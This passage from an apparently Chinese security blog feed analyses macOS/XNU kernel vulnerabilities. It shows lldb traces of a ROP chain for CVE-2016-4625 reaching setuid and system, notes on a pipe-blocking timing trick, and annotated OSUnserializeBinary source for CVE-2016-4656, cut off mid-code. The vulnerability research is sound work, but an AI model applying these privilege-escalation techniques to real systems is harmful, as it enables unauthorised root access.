0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf8 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1947&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfa libsystem_c.dylib`realpath$DARWIN_EXTSN + 1949&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfc libsystem_c.dylib`realpath$DARWIN_EXTSN + 1951&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfc &#60;+1951&#62;: pop    rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cfd libsystem_c.dylib`realpath$DARWIN_EXTSN + 1952&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cfd &#60;+1952&#62;: ret&#10;    0x7fff8fed1cfe &#60;+1953&#62;: call   0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: mov    dword ptr [rax], 0x3e&#10;    0x7fff8fed1d09 &#60;+1964&#62;: jmp    0x7fff8fed1734            ; &#60;+471&#62;&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe520d5 libsystem_c.dylib`strcpy + 85&#10;libsystem_c.dylib`strcpy:&#10;-&#62;  0x7fff8fe520d5 &#60;+85&#62;: ret&#10;    0x7fff8fe520d6 &#60;+86&#62;: movdqu xmm0, xmmword ptr [rsi + rcx]&#10;    0x7fff8fe520db &#60;+91&#62;: movdqu xmmword ptr [rdi], xmm0&#10;    0x7fff8fe520df &#60;+95&#62;: mov    rax, rdi</span><br></pre></td></tr></table></figure>
<p>可以看到，最后一个执行的 是<code>0x7fff8fe520d5</code>处的<code>ret</code>。</p>
<p>观察寄存器可以发现$rip=<code>0x00007fff8fe520d5</code>,$rsp=<code>0x00007fff523dea18</code>。而栈已经变成了这样了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 100  0x00007fff523dea18&#10;0x7fff523dea18: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea28: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea38: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea48: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea58: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea68: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea78: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea88: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523dea98: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>继续执行代码</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fe8a213 libsystem_c.dylib`addr2ascii + 116&#10;libsystem_c.dylib`addr2ascii:&#10;-&#62;  0x7fff8fe8a213 &#60;+116&#62;: pop    rdi&#10;    0x7fff8fe8a214 &#60;+117&#62;: ret&#10;    0x7fff8fe8a215 &#60;+118&#62;: add    al, 0x0&#10;    0x7fff8fe8a217 &#60;+120&#62;: mov    rax, rbx</span><br></pre></td></tr></table></figure>
<p>执行了我们的第一个<code>ROP</code>的 <code>gad_get</code>。这个时候再观察我们的函数栈</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8 -format x -count 30  $rsp-0x20&#10;0x7fff523def50: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x7fff523def60: 0x00007fff8fe520d5 0x00007fff8fe8a213&#10;0x7fff523def70: 0x0000000000000000 0x00007fff8a183628&#10;0x7fff523def80: 0x00007fff8fe8a213 0x00007fff8fedb69e&#10;0x7fff523def90: 0x00007fff8fed0e0b 0x0000000000000000&#10;0x7fff523defa0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defb0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defc0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defd0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523defe0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523deff0: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df000: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df010: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df020: 0x0000000000000000 0x0000000000000000&#10;0x7fff523df030: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>就是我们构造的栈。</p>
<p>继续执行，也确实会看到相应的函数被执行。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8a183628 libsystem_kernel.dylib`setuid, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8a183628 libsystem_kernel.dylib`setuid&#10;libsystem_kernel.dylib`setuid:&#10;-&#62;  0x7fff8a183628 &#60;+0&#62;:  mov    eax, 0x2000017&#10;    0x7fff8a18362d &#60;+5&#62;:  mov    r10, rcx&#10;    0x7fff8a183630 &#60;+8&#62;:  syscall&#10;    0x7fff8a183632 &#60;+10&#62;: jae    0x7fff8a18363c            ; &#60;+20&#62;&#10;   ...&#30465;&#30053;n&#27493;...&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed0e0b libsystem_c.dylib`system, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed0e0b libsystem_c.dylib`system&#10;libsystem_c.dylib`system:</span><br></pre></td></tr></table></figure>
<p>到此，<code>exploit</code>最基本的逻辑算是理清楚了。</p>
<h1 id="0x04_关于阻塞子进程">0x04 关于阻塞子进程</h1><p>​    阻塞子进程的技巧所要达到的目的就是，让子进程调用<code>execve</code>函数之后，内核中执行完<code>task_t</code>相关数据修改后因为<code>Pipe</code>阻塞的并且已经满了，所以不会立即开始执行<code>traceroute6</code>的<code>main</code>函数。这样就给父进程做内存改写的时间窗口。</p>
<h1 id="0x05_小结">0x05 小结</h1><p>​    分析到这里，只是初步了解了<code>exploit</code>的原理，对整个漏洞的分析才刚刚开始，有更多值得挖掘和思考的地方。这篇文章仅仅希望能够帮助大家解决研究<code>OS X</code>内核漏洞的一些最基础的问题和小技巧。如果有不足之处还希望大家指出：）</p>
<h1 id="reference">reference</h1><p>1.<a href="http://lldb.llvm.org/lldb-gdb.html" target="_blank" rel="external">The LLDB Debugger</a></p>
<p>2.<a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">task_t considered harmful</a></p>
<p>3.<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">How to boot into OS X Recovery Mode on Parallels Desktop</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>​    前两天<a href="https://googleprojectzero.blogspot.com/">Project Zero</a>的blog上面，Ian Beer发表了一篇新的文章，讨论了在<code>xnu</code> 的内核在设计上存在的一个问题，从而可以导致提权，沙箱逃逸等一洗了的问题。并且提供了相应的的POC与EXP源码。这篇文章是调试与分析其中第一个漏洞<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4625">CVE-2016-4625</a>的部分。</p>
<p><a href="https://googleprojectzero.blogspot.com/2016/10/taskt-considered-harmful.html">task_t considered harmful</a></p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=831&amp;can=1&amp;q=apple&amp;sort=-id">OS X/iOS kernel use-after-free in IOSurface</a></p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="POC" scheme="http://turingh.github.io/tags/POC/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-4656分析与调试]]></title>
    <link href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
    <id>http://turingh.github.io/2016/09/07/CVE-2016-4656分析与调试/</id>
    <published>2016-09-07T20:48:47.000Z</published>
    <updated>2016-09-07T22:20:09.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p> <a href="http://blog.pangu.io/pegasus-apt/" target="_blank" rel="external">Pegasus – 针对iOS设备的APT攻击分析- PanguTeam</a></p>
<p> <a href="http://www.freebuf.com/articles/terminal/113128.html" target="_blank" rel="external">iOS“远程越狱”间谍软件Pegasus技术分析</a></p>
<p>关心<code>IOS</code>安全的技术人员最近一定都关注了这一次的安全事件，不需要多做描述了，想了解具体细节的可以自行<code>google</code>。</p>
<p>本文内容</p>
<ul>
<li>了漏洞所在的函数<code>OSUnserializeBinary</code>，了解其二进制格式</li>
<li>理解<code>POC</code>，分析<code>POC</code>执行的流程</li>
</ul>
<p>具体的技术背景，可以参考下面这篇文章</p>
<p><a href="https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained</a></p>
<p><a href="https://sektioneins.de/en/blog/16-09-05-pegasus-ios-kernel-vulnerability-explained-part-2.html" target="_blank" rel="external">PEGASUS iOS Kernel Vulnerability Explained - Part 2</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2996.html" target="_blank" rel="external">iOS三叉戟漏洞补丁分析、利用代码 公布（POC）</a></p>
<a id="more"></a>
<h1 id="0x01_OSUnserializeBinary">0x01 OSUnserializeBinary</h1><p>在软件开发的流程中，在两个模块进行通信时，都会遇到使用<code>序列化</code>和<code>反序列化</code>传递一些数据结构，或者内部数据，比较典型的就是<code>google</code>的<code>protobuf</code>。</p>
<p>在<code>XNU</code>内核之中，自己实现了一套<code>C++</code>的子集，为<code>IOKIT</code>的开发提供支持，其中就提供了一套自己的序列化与反序列化的逻辑。</p>
<p>这次出现问题的<code>OSUnserializeBinary</code>便是这一个模块中的一个函数。</p>
<h2 id="1-1_OSUnserializeBinary">1.1 OSUnserializeBinary</h2><p>下面是对源码的简单分析。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">OSObject *</span><br><span class="line">OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString)</span><br><span class="line">&#123;</span><br><span class="line">	/*</span><br><span class="line">		...初始化变量</span><br><span class="line">	*/</span><br><span class="line">	if (errorString) *errorString = 0;</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	#define kOSSerializeBinarySignature "\323\0\0"</span><br><span class="line">	*/</span><br><span class="line">  </span><br><span class="line">  	// 等待反序列化的二进制数据存在一定的格式</span><br><span class="line">  </span><br><span class="line">	// 检测是否是是具有签名的内存数据</span><br><span class="line">	if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);</span><br><span class="line">	</span><br><span class="line">	if (3 &amp; ((uintptr_t) buffer)) return (NULL);</span><br><span class="line">	// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span><br><span class="line">	if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);</span><br><span class="line">	// 跳过内存开始的签名部分，获取第一个需要解析的内存</span><br><span class="line">	bufferPos = sizeof(kOSSerializeBinarySignature);</span><br><span class="line">	next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);</span><br><span class="line"></span><br><span class="line">	DEBG("---------OSUnserializeBinary(%p)\n", buffer);</span><br><span class="line"></span><br><span class="line">  	// 反序列化流程中会使用到的一些状态变量</span><br><span class="line">	objsArray = stackArray    = NULL;</span><br><span class="line">	objsIdx   = objsCapacity  = 0;</span><br><span class="line">	stackIdx  = stackCapacity = 0;</span><br><span class="line"></span><br><span class="line">    result   = 0;</span><br><span class="line">    parent   = 0;</span><br><span class="line">	dict     = 0;</span><br><span class="line">	array    = 0;</span><br><span class="line">	set      = 0;</span><br><span class="line">	sym      = 0;</span><br><span class="line"></span><br><span class="line">	ok = true;</span><br><span class="line">	while (ok)</span><br><span class="line">	&#123;</span><br><span class="line">		// 通过next指向的内容获取当前的key的pos</span><br><span class="line">		bufferPos += sizeof(*next);</span><br><span class="line">		// 检测是否分析完成</span><br><span class="line">		if (!(ok = (bufferPos &lt;= bufferSize))) break;</span><br><span class="line">		// 获取当前的k</span><br><span class="line">		key = *next++;</span><br><span class="line"></span><br><span class="line">        len = (key &amp; kOSSerializeDataMask);</span><br><span class="line">        wordLen = (len + 3) &gt;&gt; 2; //计算要用几个word</span><br><span class="line">		end = (0 != (kOSSerializeEndCollecton &amp; key));</span><br><span class="line">        DEBG("key 0x%08x: 0x%04x, %d\n", key, len, end);</span><br><span class="line"></span><br><span class="line">        newCollect = isRef = false;</span><br><span class="line">		o = 0; newDict = 0; newArray = 0; newSet = 0;</span><br><span class="line">		</span><br><span class="line">		//根据key的不同对不同的数据结构做操作</span><br><span class="line">		switch (kOSSerializeTypeMask &amp; key)</span><br><span class="line">		&#123;</span><br><span class="line">		    case kOSSerializeDictionary:</span><br><span class="line">				o = newDict = OSDictionary::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		    case kOSSerializeArray:</span><br><span class="line">				o = newArray = OSArray::withCapacity(len);</span><br><span class="line">				newCollect = (len != 0);</span><br><span class="line">		        break;</span><br><span class="line">		  	/*</span><br><span class="line">		  		...</span><br><span class="line">		  	*/</span><br><span class="line">		    default:</span><br><span class="line">		        break;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//退出循环</span><br><span class="line">		if (!(ok = (o != 0))) break;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		//如果反序列化的结果不是一个reference</span><br><span class="line">		//就将结果存放到objsArray之中</span><br><span class="line">		if (!isRef)</span><br><span class="line">		&#123;</span><br><span class="line">			setAtIndex(objs, objsIdx, o);</span><br><span class="line">			//如果ok的值为false，则退出反序列化循环</span><br><span class="line">			</span><br><span class="line">			//	#define kalloc_container(size)	</span><br><span class="line">			//		kalloc_tag_bt(size, VM_KERN_MEMORY_LIBKERN)</span><br><span class="line">			/*</span><br><span class="line">				typeof(objsArray) nbuf = (typeof(objsArray)) kalloc_container(ncap * sizeof(o));	</span><br><span class="line">				if (!nbuf) ok = false;</span><br><span class="line">			*/</span><br><span class="line">			</span><br><span class="line">			//在内核中申请ncap*sizeof（o）大小的内存，如果申请失败的了则ok设为false</span><br><span class="line">			if (!ok) &#123;</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			objsIdx++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		//对解析出来的o进行不同的操作</span><br><span class="line">		if (dict)</span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (array) </span><br><span class="line">		&#123;</span><br><span class="line">			/*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else if (set)</span><br><span class="line">		&#123;</span><br><span class="line">		   /*...*/</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">		    /*...*/</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		if (!ok) break;</span><br><span class="line"></span><br><span class="line">      	//解析的流程中出现了一些新的容器</span><br><span class="line">		if (newCollect)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!end)</span><br><span class="line">			&#123;</span><br><span class="line">				stackIdx++;</span><br><span class="line">				setAtIndex(stack, stackIdx, parent);</span><br><span class="line">				if (!ok) break;</span><br><span class="line">			&#125;</span><br><span class="line">			DEBG("++stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			parent = o;</span><br><span class="line">			dict   = newDict;</span><br><span class="line">			array  = newArray;</span><br><span class="line">			set    = newSet;</span><br><span class="line">			end    = false;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">      	//解析结束</span><br><span class="line">		if (end)</span><br><span class="line">		&#123;</span><br><span class="line">			if (!stackIdx) break;</span><br><span class="line">			parent = stackArray[stackIdx];</span><br><span class="line">			DEBG("--stack[%d] %p\n", stackIdx, parent);</span><br><span class="line">			stackIdx--;</span><br><span class="line">			set   = 0; </span><br><span class="line">			dict  = 0; </span><br><span class="line">			array = 0;</span><br><span class="line">			if (!(dict = OSDynamicCast(OSDictionary, parent)))</span><br><span class="line">			&#123;</span><br><span class="line">				if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DEBG("ret %p\n", result);</span><br><span class="line"></span><br><span class="line">	if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));</span><br><span class="line">	if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));</span><br><span class="line"></span><br><span class="line">	if (!ok &amp;&amp; result)</span><br><span class="line">	&#123;</span><br><span class="line">		result-&gt;release();</span><br><span class="line">		result = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	return (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2_setAtIndex">1.2 setAtIndex</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> setAtIndex(v, idx, o)													\</span><br><span class="line">	<span class="keyword">if</span> (idx &gt;= v##Capacity)														\</span><br><span class="line">	&#123;																			\</span><br><span class="line">		uint32_t ncap = v##Capacity + <span class="number">64</span>;										\</span><br><span class="line">		typeof(v##Array) nbuf = (typeof(v##Array)) kalloc_container(ncap * sizeof(o));	\</span><br><span class="line">		<span class="keyword">if</span> (!nbuf) ok = false;													\</span><br><span class="line">		<span class="keyword">if</span> (v##Array)															\</span><br><span class="line">		&#123;																		\</span><br><span class="line">			bcopy(v##Array, nbuf, v##Capacity * sizeof(o));						\</span><br><span class="line">			kfree(v##Array, v##Capacity * sizeof(o));							\</span><br><span class="line">		&#125;																		\</span><br><span class="line">		v##Array    = nbuf;														\</span><br><span class="line">		v##Capacity = ncap;														\</span><br><span class="line">	&#125;																			\</span><br><span class="line">	<span class="keyword">if</span> (ok) v##Array[idx] = o;</span></span><br></pre></td></tr></table></figure>
<p>这一段宏用在代码中大意如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (idx&gt;v<span class="preprocessor">##capacity)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 扩充数组*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ok) </span><br><span class="line">&#123;</span><br><span class="line">  v<span class="preprocessor">##Array[idx]=o</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大意就是讲数据<code>o</code>放置到数组中的<code>idx</code>处，如果数组不够大了就扩充一下数组的大小。</p>
<h2 id="1-3_源码分析">1.3 源码分析</h2><p>​    该函数的大致流程与我们通常遇到的反序列化函数形式基本相同，分为以下几步</p>
<ul>
<li>检测二进制文件格式，是否符合要求</li>
<li>依次读取二进制数据，进行分析，并且将解析的结果存放到对应的数据结构之中</li>
</ul>
<h3 id="1-3-1_二进制文件格式">1.3.1 二进制文件格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测是否是是具有签名的内存数据</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">strcmp</span>(kOSSerializeBinarySignature, buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">3</span> &amp; ((<span class="keyword">uintptr_t</span>) buffer)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 检测buffersize的大小要小于kOSSerializeBinarySignature的大小</span></span><br><span class="line"><span class="keyword">if</span> (bufferSize &lt; <span class="keyword">sizeof</span>(kOSSerializeBinarySignature)) <span class="keyword">return</span> (<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>可以看出，需要解析的二进制数据，一定是已<code>kOSSerializeBinarySignature</code>开始的。具体的定义如下图所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> kOSSerializeBinarySignature <span class="string">"\323\0\0"</span></span></span><br></pre></td></tr></table></figure>
<p>在通过签名的检测之后，就会根据每一块读出的内存进行分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      key = *next++;</span><br><span class="line"></span><br><span class="line">      len = (key &amp; kOSSerializeDataMask); <span class="comment">//获取len的值</span></span><br><span class="line">      wordLen = (len + <span class="number">3</span>) &gt;&gt; <span class="number">2</span>; <span class="comment">//计算要用几个word</span></span><br><span class="line">   end = (<span class="number">0</span> != (kOSSerializeEndCollecton &amp; key)) <span class="comment">//获取end的值;</span></span><br><span class="line">   	<span class="comment">/*...*/</span></span><br><span class="line"><span class="comment">//根据key的不同对不同的数据结构做操作</span></span><br><span class="line"><span class="keyword">switch</span> (kOSSerializeTypeMask &amp; key)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*....*/</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-2_数据存放">1.3.2 数据存放</h3><p>解析之后得到的数据，会被存放到对应的数据结构之中去。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 